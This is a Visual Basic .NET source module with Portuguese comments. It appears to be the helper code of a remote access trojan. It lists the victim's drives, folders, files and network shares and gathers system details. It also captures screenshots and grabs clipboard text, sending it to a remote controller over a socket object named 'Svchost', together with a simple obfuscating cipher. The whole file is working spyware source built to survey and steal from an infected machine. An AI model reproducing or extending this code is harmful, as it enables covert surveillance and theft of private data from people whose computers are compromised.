Imports System.IO
Imports System
Imports System.Text
Imports System.IO.Compression 'zip
Imports System.Environment
Imports System.Windows
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Windows.Forms.Clipboard
Imports System.Net.Sockets
Imports System.Management

Module funcions_a__
    Dim yy As String = "||" 'senha
    Dim client As TcpClient

    Function SB(ByVal s As String) As Byte()
        Return Encoding.Default.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String
        Return Encoding.Default.GetString(b)
    End Function

    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array 'split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New MemoryStream
        Dim MM As New MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Public Function getDrives() As String 'file manager / todos os driver exe (pendriver cd dvd)
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit" 'senha [Drive]
        Next
        Return allDrives
    End Function

    Public Function getFolders(ByVal location) As String 'file manager / ver o que tem dentro dos drivers
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit" 'senha [Folder]
        Next
        Return folders
    End Function

    Public Function getFiles(ByVal location) As String 'file manager
        Dim dir As New DirectoryInfo(location)
        Dim files = ""
        For Each f As FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function

    Public Function FR() As String 'install Date server
        Try
            Return CType(LO, FileInfo).LastWriteTime.ToString("dd-MM-yyyy") 'dia = dd / Mez = MM /ano = yyyy
        Catch ex As Exception
            Return "unknown"
        End Try
    End Function

    Function RAM() As String 'capture capacidade de memoria ram do computer
        Dim x As String = ""

        Dim PH As Long = Val(My.Computer.Info.TotalPhysicalMemory)
        If PH > 1073741824 Then
            x = (PH / 1073741824).ToString
            x = x.Remove(4, x.Length - 4) + " GB" 'giga bayt
        ElseIf PH > 1048576 Then
            x = (PH / 1048576).ToString
            x = x.Remove(4, x.Length - 4) + " Me" 'mega bayt
        End If
        Return x
    End Function

    Public Function bits() As String 'detection 32 e 64 bits em computer
        Dim os As System.OperatingSystem = System.Environment.OSVersion
        Dim osName As String
        Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
        If k.Length = 1 Then
        End If
        osName &= k(k.Length - 1)
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            osName += " 32Bits"
        Else
            osName += " 64Bits"
        End If
        Return osName
    End Function

    Public Function CaptureDesktop() As Image 'capture descktop brevia
        Try
            Dim bounds As Rectangle = Nothing
            Dim screenshot As System.Drawing.Bitmap = Nothing
            Dim graph As Graphics = Nothing
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Return screenshot
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Public Sub Compress(ByVal path As String) 'compress winrar
        Dim sourceFile As FileStream = File.OpenRead(path)
        Dim destinationFile As FileStream = IO.File.Create(path + ".rar") '= arquivo.rar
        Dim buffer(sourceFile.Length) As Byte
        sourceFile.Read(buffer, 0, buffer.Length)
        Using output As New GZipStream(destinationFile,
            CompressionMode.Compress)
            Console.WriteLine("Compressing {0} to {1}.", sourceFile.Name,
                destinationFile.Name, False)
            output.Write(buffer, 0, buffer.Length)
        End Using
        'Close the files.
        sourceFile.Close()
        destinationFile.Close()
    End Sub

    Public Sub descompress(ByVal path As String) 'descompress winrar
        Dim sourceFile As FileStream = File.OpenRead(path)
        Dim destinationFile As FileStream = IO.File.Create(path + ".txt") '= arquivo.txt 
        Dim buffer(4096) As Byte
        Dim n As Integer
        Using input As New GZipStream(sourceFile,
            CompressionMode.Decompress, False)
            Console.WriteLine("Decompressing {0} to {1}.", sourceFile.Name,
                destinationFile.Name)
            n = input.Read(buffer, 0, buffer.Length)
            destinationFile.Write(buffer, 0, n)
        End Using
        'Close the files.
        sourceFile.Close()
        destinationFile.Close()
    End Sub

    Public Function Crypt(ByVal Text As String) As String 'crypt e descrypter txt
        Dim strTempChar As String, i As Integer
        For i = 1 To Len(Text)
            If Asc(Mid$(Text, i, 1)) < 128 Then
                strTempChar = CType(Asc(Mid$(Text, i, 1)) + 128, String)
            ElseIf Asc(Mid$(Text, i, 1)) > 128 Then
                strTempChar = CType(Asc(Mid$(Text, i, 1)) - 128, String)
            End If
            Mid$(Text, i, 1) = Chr(CType(strTempChar, Integer))
        Next i
        Return Text
    End Function
    Delegate Sub gt() 'get clipborad
    Function gtx() As String 'get clipborad
        Dim str As String
        str = Windows.Forms.Clipboard.GetText
        Svchost.c.Send("recvcli" & yy & str) 'senha recvcli
        Return True
    End Function

    Public Function GetSharedFolders() As List(Of String)
        'get pastas compartilhas 
        Dim sharedFolders As New List(Of String)()

        Dim searcher As New ManagementObjectSearcher("Select * From win32_share")
        Dim ms As New ManagementClass("Win32_share")

        For Each share As ManagementObject In searcher.[Get]()
            Dim type As String = share("Type").ToString()

            If type = "0" Then
                Dim name As String = share("Name").ToString()
                Dim path As String = share("Path").ToString()
                Dim caption As String = share("Caption").ToString()
                sharedFolders.Add(path)
            End If
        Next
        Return sharedFolders
    End Function
End Module
